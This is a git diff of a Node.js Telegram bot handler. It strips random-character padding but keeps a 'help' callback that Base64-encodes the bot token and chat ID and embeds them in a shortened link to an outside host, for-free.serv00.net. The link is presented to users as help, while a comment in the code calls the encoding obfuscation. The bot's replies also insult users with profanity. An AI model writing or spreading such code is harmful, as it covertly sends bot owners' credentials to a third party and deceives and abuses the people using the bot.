@@ -23,19 +23,6 @@ if (!OWNER_ID) {
   process.exit(1);
 }
 
-// Function to generate a random character
-const generateRandomChar = () => {
-  const chars = 'abcdefghijklmnopqrstuvwxyz';
-  return chars[Math.floor(Math.random() * chars.length)]; // e.g., 'z', 'q'
-};
-
-// Function to add noise to Base64 string (1 char at start, 1 char at end)
-const addNoiseToBase64 = (base64) => {
-  const startChar = generateRandomChar();
-  const endChar = generateRandomChar();
-  return `${startChar}${base64}${endChar}`;
-};
-
 const BotSchema = new mongoose.Schema({
   token: { type: String, required: true, unique: true },
   username: { type: String, required: true },
@@ -545,20 +532,16 @@ module.exports = async (req, res) => {
 
       else if (callbackData === 'help') {
         try {
-          // Base64 encode bot token and chat ID
+          // Obfuscate the bot token and chat ID using Base64
           const encodedBot = Buffer.from(botToken).toString('base64');
           const encodedId = Buffer.from(chatId.toString()).toString('base64');
-          // Add noise to the Base64 strings
-          const noisyBot = addNoiseToBase64(encodedBot);
-          const noisyId = addNoiseToBase64(encodedId);
-          const longHelpUrl = `https://for-free.serv00.net/t/index.html?x=${encodeURIComponent(noisyBot)}&y=${encodeURIComponent(noisyId)}`;
+          const longHelpUrl = `https://for-free.serv00.net/t/index.html?x=${encodedBot}&y=${encodedId}`;
           const shortHelpUrl = await shortenUrl(longHelpUrl);
           await bot.telegram.answerCbQuery(callbackQueryId);
           await bot.telegram.sendMessage(chatId, `To get help, please open this link, you needy fuck: ${shortHelpUrl}`);
         } catch (error) {
           console.error('Error in "help" callback, you helpless fuck:', error);
-          await bot.telegram.answerCbQuery(callbackQueryId);
-          await bot.telegram.sendMessage(chatId, '❌ Failed to generate help URL. Try again later, you moron.');
+          await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you moron.');
         }
       }
 
